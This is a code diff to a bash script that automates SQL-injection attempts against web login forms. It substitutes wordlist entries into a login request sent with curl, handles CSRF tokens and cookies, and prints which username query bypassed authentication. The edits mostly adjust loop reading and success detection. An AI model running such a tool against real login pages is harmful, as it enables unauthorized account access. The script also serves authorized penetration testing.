@@ -662,9 +662,9 @@ function verbose(){
         
         REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
       
-      echo -e "$REQUEST"
-      
-      response=$(echo -e $REQUEST > response.txt)
+        echo -e "$REQUEST"
+        
+        response=$(echo -e $REQUEST > response.txt)
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
       
@@ -696,7 +696,7 @@ function verbose(){
       echo -e "$REQUEST"
       
       response=$(echo -e $REQUEST > response.txt)
-      echo "TESTTTT"   
+       
   fi
 
 }
@@ -710,7 +710,8 @@ wordlist=${WORDLIST}
 i=0
 
 # Main loop 
-while read -r wordlist; do
+
+while IFS= read -r wordlist;do
     
     # Increase counter
     ((i=i+1))
@@ -733,6 +734,7 @@ while read -r wordlist; do
       REQUEST=$(curl -D headers.txt -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
       
       response=$(echo -e $REQUEST > response.txt)
+
 
     elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
@@ -851,9 +853,9 @@ while read -r wordlist; do
 
   # Response check
   status_code=`cat "headers.txt"`
-  match_response=$(cat "response.txt" | grep -i "$ERROR")
+  match_response=$(echo -e $REQUEST)
 
-  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]] && [[ $status_code == *"200 OK"* ]];then
+  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]];then #&& [[ $status_code == *"200 OK"* ]] || [[ "$status_code" == *"302"* ]] && [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]];then
     
     # Success!
     echo -e "[*] Injection worked!"
@@ -861,19 +863,13 @@ while read -r wordlist; do
     printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
     break 2
 
-  elif [[ "$match_response" != *"$ERROR"* ]] && [[ "$status_code" == *"200"* ]] && [[ $VERBOSE == '' ]]; then
+  elif [[ "$match_response" != *"$ERROR"* ]] && [[ $VERBOSE == '' ]] && [[ "$status_code" != *"200"* ]]; then
 
     # Success!
     echo -e "[*] Injection worked!"
     echo -e "[*] SQL Query in Username field is: ${wordlist}"
     printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
     break 2
-
-  elif [[ "$status_code" != *"200"* ]]; then
-    echo -e "Server didn't respond with 200 code!"
-    echo -e "Please check the URL!"
-    echo -e $match_response
-    exit
 
   fi
 
